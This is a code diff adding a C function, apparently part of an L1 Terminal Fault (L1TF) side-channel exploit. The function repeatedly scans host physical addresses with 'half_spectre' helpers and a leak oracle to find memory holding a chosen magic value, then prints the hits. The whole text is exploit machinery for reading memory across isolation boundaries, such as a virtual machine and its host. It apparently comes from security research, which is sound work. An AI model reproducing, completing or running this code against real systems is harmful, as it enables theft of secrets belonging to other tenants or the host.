@@ -983,6 +983,38 @@ uintptr_t l1tf_find_base(void)
   return -1;
 }
 
+static int same_cacheline(pa_t a, pa_t b)
+{
+  return (a >> 6) == (b >> 6);
+}
+
+hpa_t l1tf_find_magic16(hpa_t base, uint16_t magic, hpa_t start, hpa_t end, int step)
+{
+  const int verbose = 1;
+  hpa_t pa;
+  half_spectre_start(base, start);
+  hpa_t hs_pa = start;
+  for (int run = 0; run < 10000; run++) {
+    for (pa = start; pa < end; pa += step) {
+      if (!same_cacheline(pa, hs_pa)) {
+        half_spectre_stop();
+        half_spectre_start(base, pa);
+        hs_pa = pa;
+      }
+
+      int hits = l1tf_oracle16(magic, pa, 10000, NULL);
+      if (hits) {
+        if (verbose) printf("pa = %16lx  hits = %d\n", pa, hits);
+        break;
+      }
+    }
+    if (run % 100 == 0)
+      printf(" run = %d\n", run);
+  }
+  half_spectre_stop();
+  return pa;
+}
+
 void l1tf_init(void)
 {
 #if LEAK == L1TF || LEAK == SKIP
